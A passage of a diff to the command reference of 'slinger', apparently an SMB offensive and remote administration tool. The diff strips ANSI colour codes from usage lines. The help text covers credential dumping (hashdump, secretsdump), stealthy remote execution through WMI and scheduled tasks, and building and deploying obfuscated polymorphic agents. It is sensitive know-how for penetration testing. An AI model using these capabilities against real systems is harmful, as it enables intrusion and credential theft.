 List running processes on the remote server
 ```
 
@@ -2163,7 +2179,7 @@ Example Usage: procs -t -v
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger procs[0m [[32m-h[0m] [[32m-v[0m] [[32m-t[0m]
+procs [-h] [-v] [-t]
 List running processes on the remote server
 ```
 
@@ -2180,7 +2196,7 @@ Example Usage: procs -t -v
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger fwrules[0m [[32m-h[0m]
+fwrules [-h]
 Display firewall rules on the remote server
 ```
 
@@ -2197,7 +2213,7 @@ Example Usage: fwrules
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger set[0m [[32m-h[0m] [32mvarname[0m [32m[value][0m
+set [-h] varname [value]
 Set a variable for use in the application
 ```
 
@@ -2223,7 +2239,7 @@ Example Usage: set varname value
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger config[0m [[32m-h[0m]
+config [-h]
 Show the current config
 ```
 
@@ -2240,7 +2256,7 @@ Example Usage: config
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger run[0m [[32m-h[0m] ([32m-c [33mCMD_CHAIN[0m | [32m-f [33mFILE[0m)
+run [-h] (-c CMD_CHAIN | -f FILE)
 Run a slinger script or command sequence
 ```
 
@@ -2265,7 +2281,7 @@ Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger hashdump[0m [[32m-h[0m]
+hashdump [-h]
 Dump hashes from the remote server
 ```
 
@@ -2282,7 +2298,7 @@ Example Usage: hashdump
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger secretsdump[0m [[32m-h[0m]
+secretsdump [-h]
 Dump secrets from the remote server
 ```
 
@@ -2299,7 +2315,7 @@ Example Usage: secretsdump
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger env[0m [[32m-h[0m]
+env [-h]
 Display environment variables on the remote server
 ```
 
@@ -2316,7 +2332,7 @@ Example Usage: env
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger debug-availcounters[0m [[32m-h[0m] [[32m-f [33mFILTER[0m] [[32m-p[0m] [[32m-s [33mfilename[0m]
+debug-availcounters [-h] [-f FILTER] [-p] [-s filename]
 Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.
 ```
 
@@ -2341,7 +2357,7 @@ Example Usage: availcounters
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger debug-counter[0m [[32m-h[0m] [[32m-c [33mCOUNTER[0m] [[32m-a [33m{x86,x64,unk}[0m] [[32m-i[0m]
+debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}] [-i]
 Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.
 ```
 
@@ -2368,7 +2384,7 @@ Example Usage: counter -c 123 [-a x86]
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger network[0m [[32m-h[0m] [[36m--tcp[0m] [[36m--rdp[0m]
+network [-h] [--tcp] [--rdp]
 Display network information on the remote server
 ```
 
@@ -2385,7 +2401,8 @@ Example Usage: network
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger atexec[0m [[32m-h[0m] [32m-c [33mCOMMAND[0m [36m--sp [33mSP[0m [[36m--sn [33mSN[0m] [[36m--tn [33mTN[0m] [[36m--ta [33mTA[0m] [[36m--td [33mTD[0m] [[36m--tf [33mTF[0m] [[36m--sh [33mSH[0m] [[32m-i[0m] [[32m-w [33mWAIT[0m]
+atexec [-h] -c COMMAND --sp SP [--sn SN] [--tn TN] [--ta TA]
+                      [--td TD] [--tf TF] [--sh SH] [-i] [-w WAIT]
 Execute a command on the remote server
 ```
 
@@ -2438,7 +2455,7 @@ For multi-word commands: atexec -c "echo hello world" -tn MyTask
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger reload[0m [[32m-h[0m]
+reload [-h]
 Reload the current sessions context
 ```
 
@@ -2455,7 +2472,7 @@ Example Usage: reload
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger plugins[0m [[32m-h[0m]
+plugins [-h]
 List available plugins
 ```
 
@@ -2472,7 +2489,7 @@ Example Usage: plugins
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger downloads[0m [[32m-h[0m] [32m{list,cleanup} ...[0m
+downloads [-h] {list,cleanup} ...
 Manage resume download states and cleanup
 ```
 
@@ -2489,7 +2506,7 @@ Example Usage: downloads list
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger downloads list[0m [[32m-h[0m]
+downloads list [-h]
 Display all active resumable downloads with progress
 ```
 
@@ -2503,7 +2520,7 @@ Display all active resumable downloads with progress
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger downloads cleanup[0m [[32m-h[0m] [[36m--max-age [33mMAX_AGE[0m] [[36m--force[0m]
+downloads cleanup [-h] [--max-age MAX_AGE] [--force]
 Remove completed, stale, or corrupted download state files
 ```
 
@@ -2521,7 +2538,7 @@ Remove completed, stale, or corrupted download state files
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger eventlog[0m [[32m-h[0m] [32m{query,list,check} ...[0m
+eventlog [-h] {query,list,check} ...
 Query Windows Event Logs via RPC over SMB named pipe \pipe\eventlog
 ```
 
@@ -2542,8 +2559,12 @@ Example Usage:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger eventlog query[0m [[32m-h[0m] [36m--log [33mLOG[0m [[36m--id [33mID[0m] [[36m--type [33m{error,warning,information,success,failure}[0m] [[36m--since [33mSINCE[0m] [[36m--last [33mMINUTES[0m] [[36m--limit [33mLIMIT[0m] [[36m--source [33mSOURCE[0m] [[36m--find [33mFIND[0m] [[36m--format [33m{table,json,list,csv}[0m]
-                              [[32m-o [33mOUTPUT[0m] [[36m--verbose[0m] [[36m--order [33m{newest,oldest}[0m]
+eventlog query [-h] --log LOG [--id ID]
+                              [--type {error,warning,information,success,failure}]
+                              [--since SINCE] [--last MINUTES] [--limit LIMIT]
+                              [--source SOURCE] [--find FIND]
+                              [--format {table,json,list,csv}] [-o OUTPUT]
+                              [--verbose] [--order {newest,oldest}]
 Query Windows Event Log entries via RPC over \pipe\eventlog with filtering
 ```
 
@@ -2584,7 +2605,7 @@ Examples:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger eventlog list[0m [[32m-h[0m]
+eventlog list [-h]
 List all available event logs on the remote system via RPC over \pipe\eventlog
 ```
 
@@ -2598,7 +2619,7 @@ List all available event logs on the remote system via RPC over \pipe\eventlog
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger eventlog check[0m [[32m-h[0m] [36m--log [33mLOG[0m
+eventlog check [-h] --log LOG
 Check if a specific Windows Event Log exists and is accessible
 ```
 
@@ -2620,7 +2641,7 @@ Example Usage: eventlog check --log 'Microsoft-Windows-Sysmon/Operational'
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger wmiexec[0m [[32m-h[0m] [[36m--endpoint-info[0m] [32mMETHOD ...[0m
+wmiexec [-h] [--endpoint-info] METHOD ...
 Execute commands on the remote system using various WMI execution methods. Each method has different capabilities, stealth levels, and requirements.
 ```
 
@@ -2645,8 +2666,12 @@ Example Usage:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger wmiexec dcom[0m [[32m-h[0m] [[32m-i[0m] [[36m--working-dir [33mWORKING_DIR[0m] [[36m--timeout [33mTIMEOUT[0m] [[36m--output [33mfilename[0m] [[36m--no-output[0m] [[36m--sleep-time [33mSLEEP_TIME[0m] [[36m--save-name [33mSAVE_NAME[0m] [[36m--raw-command[0m] [[36m--shell [33m{cmd,powershell}[0m]
-                            [32m[command][0m
+wmiexec dcom [-h] [-i] [--working-dir WORKING_DIR]
+                            [--timeout TIMEOUT] [--output filename]
+                            [--no-output] [--sleep-time SLEEP_TIME]
+                            [--save-name SAVE_NAME] [--raw-command]
+                            [--shell {cmd,powershell}]
+                            [command]
 Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.
 ```
 
@@ -2716,10 +2741,17 @@ Examples:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger wmiexec event[0m [[32m-h[0m] [[36m--consumer-name [33mCONSUMER_NAME[0m] [[36m--filter-name [33mFILTER_NAME[0m] [[36m--trigger-delay [33mTRIGGER_DELAY[0m] [[36m--no-cleanup[0m] [[36m--timeout [33mTIMEOUT[0m] [[36m--no-output[0m] [[36m--save [33mfilename[0m] [[36m--working-dir [33mWORKING_DIR[0m]
-                             [[36m--shell [33m{cmd,powershell}[0m] [[36m--exe [33m{cmd,pwsh}[0m] [[36m--trigger-exe [33mTRIGGER_EXE[0m] [[32m-t [33mTRIGGER[0m] [[32m-l[0m] [[32m-i[0m] [[36m--system[0m] [[36m--upload-path [33mUPLOAD_PATH[0m] [[36m--script-name [33mSCRIPT_NAME[0m] [[32m-o [33mOUTPUT[0m] [[36m--raw-command[0m]
-                             [[36m--raw-exec [33mRAW_EXEC[0m]
-                             [32m[command][0m
+wmiexec event [-h] [--consumer-name CONSUMER_NAME]
+                             [--filter-name FILTER_NAME]
+                             [--trigger-delay TRIGGER_DELAY] [--no-cleanup]
+                             [--timeout TIMEOUT] [--no-output]
+                             [--save filename] [--working-dir WORKING_DIR]
+                             [--shell {cmd,powershell}] [--exe {cmd,pwsh}]
+                             [--trigger-exe TRIGGER_EXE] [-t TRIGGER] [-l]
+                             [-i] [--system] [--upload-path UPLOAD_PATH]
+                             [--script-name SCRIPT_NAME] [-o OUTPUT]
+                             [--raw-command] [--raw-exec RAW_EXEC]
+                             [command]
 Execute commands using WMI Event Consumers (highest stealth method).
 
 Examples:
@@ -2776,7 +2808,12 @@ Examples:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger wmiexec query[0m [[32m-h[0m] [[36m--namespace [33mNAMESPACE[0m] [[36m--format [33m{list,table,json,csv}[0m] [[32m-o [33mFILE[0m] [[36m--timeout [33mSECONDS[0m] [[36m--interactive[0m | [36m--describe [33mCLASS[0m | [36m--list-classes[0m | [36m--template [33mTEMPLATE[0m | [36m--list-templates[0m | [32mquery[0m]
+wmiexec query [-h] [--namespace NAMESPACE]
+                             [--format {list,table,json,csv}] [-o FILE]
+                             [--timeout SECONDS]
+                             [--interactive | --describe CLASS |
+                             --list-classes | --template TEMPLATE |
+                             --list-templates | query]
 Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.
 ```
 
@@ -2816,7 +2853,8 @@ Query Examples:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent[0m [[32m-h[0m] [32m{build,info,deploy,list,rename,check,use,start,kill,rm,reset,update} ...[0m
+agent [-h]
+                     {build,info,deploy,list,rename,check,use,start,kill,rm,reset,update} ...
 Build polymorphic C++ agents for named pipe command execution
 ```
 
@@ -2833,7 +2871,11 @@ Example Usage: agent build --arch x64 | agent deploy ./agent.exe --path temp\\ -
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent build[0m [[32m-h[0m] [[36m--arch [33m{x86,x64,both}[0m] [[36m--encryption[0m] [[36m--no-encryption[0m] [[36m--debug[0m] [[36m--output-dir [33mOUTPUT_DIR[0m] [[36m--dry-run[0m] [[36m--pipe [33mPIPE[0m] [[36m--name [33mNAME[0m] [[36m--pass [33mPASSPHRASE[0m] [[36m--obfuscate[0m] [[36m--upx [33mPATH[0m]
+agent build [-h] [--arch {x86,x64,both}] [--encryption]
+                           [--no-encryption] [--debug]
+                           [--output-dir OUTPUT_DIR] [--dry-run] [--pipe PIPE]
+                           [--name NAME] [--pass PASSPHRASE] [--obfuscate]
+                           [--upx PATH]
 Build C++ agents with advanced obfuscation and polymorphic encryption
 ```
 
@@ -2873,7 +2915,7 @@ Examples:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent info[0m [[32m-h[0m]
+agent info [-h]
 Display configuration and capabilities of the agent builder
 ```
 
@@ -2887,7 +2929,11 @@ Display configuration and capabilities of the agent builder
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent deploy[0m [[32m-h[0m] [36m--path [33mPATH[0m [36m--name [33mNAME[0m [[36m--start[0m] [[36m--method [33m{wmiexec,atexec}[0m] [[36m--pipe [33mPIPE[0m] [[36m--sp [33mPATH[0m] [[36m--sn [33mNAME[0m] [[36m--tn [33mNAME[0m] [[36m--ta [33mAUTHOR[0m] [[36m--td [33mDESC[0m] [[36m--tf [33mFOLDER[0m] [[36m--sh [33mSHARE[0m] [[32m-w [33mSECS[0m] [32magent_path[0m
+agent deploy [-h] --path PATH --name NAME [--start]
+                            [--method {wmiexec,atexec}] [--pipe PIPE]
+                            [--sp PATH] [--sn NAME] [--tn NAME] [--ta AUTHOR]
+                            [--td DESC] [--tf FOLDER] [--sh SHARE] [-w SECS]
+                            agent_path
 Upload and execute polymorphic agent on target system via SMB
 ```
 
@@ -2932,7 +2978,8 @@ Examples:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent list[0m [[32m-h[0m] [[36m--host [33mHOST[0m] [[36m--del [33mDELETE_AGENT[0m] [[32m-f [33m{table,list,json}[0m]
+agent list [-h] [--host HOST] [--del DELETE_AGENT]
+                          [-f {table,list,json}]
 Show all deployed agents and their status
 ```
 
@@ -2958,7 +3005,7 @@ Example: agent list -f json
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent rename[0m [[32m-h[0m] [36m--old [33mOLD[0m [36m--new [33mNEW[0m
+agent rename [-h] --old OLD --new NEW
 Change the ID of a deployed agent in the registry
 ```
 
@@ -2981,7 +3028,7 @@ Example: agent rename --old slinger_abc123 --new my_agent
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent check[0m [[32m-h[0m] [32magent_id[0m
+agent check [-h] agent_id
 Verify if the agent process is still running via WMI query
 ```
 
@@ -3023,7 +3070,7 @@ INTERACTIVE SHELL COMMANDS:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent use[0m [[32m-h[0m] [[36m--timeout [33mTIMEOUT[0m] [[36m--no-colors[0m] [32magent_id[0m
+agent use [-h] [--timeout TIMEOUT] [--no-colors] agent_id
 Connect to and interact with a deployed agent via named pipe.
 
 ENCRYPTION & SESSION SECURITY:
@@ -3067,7 +3114,10 @@ Example: agent use agent_12345 --no-colors
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent start[0m [[32m-h[0m] [[36m--method [33m{wmiexec,atexec}[0m] [[36m--sp [33mPATH[0m] [[36m--sn [33mNAME[0m] [[36m--tn [33mNAME[0m] [[36m--ta [33mAUTHOR[0m] [[36m--td [33mDESC[0m] [[36m--tf [33mFOLDER[0m] [[36m--sh [33mSHARE[0m] [[32m-w [33mSECS[0m] [32magent_id[0m
+agent start [-h] [--method {wmiexec,atexec}] [--sp PATH]
+                           [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
+                           [--tf FOLDER] [--sh SHARE] [-w SECS]
+                           agent_id
 Start a stopped or crashed agent using its deployment information
 ```
 
@@ -3109,7 +3159,10 @@ Examples:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent kill[0m [[32m-h[0m] [[36m--method [33m{wmiexec,atexec}[0m] [[36m--sp [33mPATH[0m] [[36m--sn [33mNAME[0m] [[36m--tn [33mNAME[0m] [[36m--ta [33mAUTHOR[0m] [[36m--td [33mDESC[0m] [[36m--tf [33mFOLDER[0m] [[36m--sh [33mSHARE[0m] [[32m-w [33mSECS[0m] [32magent_id[0m
+agent kill [-h] [--method {wmiexec,atexec}] [--sp PATH]
+                          [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
+                          [--tf FOLDER] [--sh SHARE] [-w SECS]
+                          agent_id
 Find and terminate the agent process using taskkill via WMI or Task Scheduler
 ```
 
@@ -3152,7 +3205,7 @@ Examples:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent rm[0m [[32m-h[0m] [32magent_id[0m
+agent rm [-h] agent_id
 Delete the agent executable file and update registry status
 ```
 
@@ -3174,7 +3227,9 @@ Example: agent rm slinger_abc123
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent reset[0m [[32m-h[0m] [[36m--method [33m{wmiexec,atexec}[0m] [[36m--sp [33mPATH[0m] [[36m--sn [33mNAME[0m] [[36m--tn [33mNAME[0m] [[36m--ta [33mAUTHOR[0m] [[36m--td [33mDESC[0m] [[36m--tf [33mFOLDER[0m] [[36m--sh [33mSHARE[0m] [[32m-w [33mSECS[0m]
+agent reset [-h] [--method {wmiexec,atexec}] [--sp PATH]
+                           [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
+                           [--tf FOLDER] [--sh SHARE] [-w SECS]
 Kill all running agent processes and delete all agent files
 ```
 
@@ -3215,7 +3270,7 @@ Examples:
 
 **Help:**
 ```
-[1;34musage: [0m[1;35mslinger agent update[0m [[32m-h[0m] [36m--path [33mPATH[0m [32magent_id[0m
+agent update [-h] --path PATH agent_id
 Update the agent's file path in the registry
 ```
 
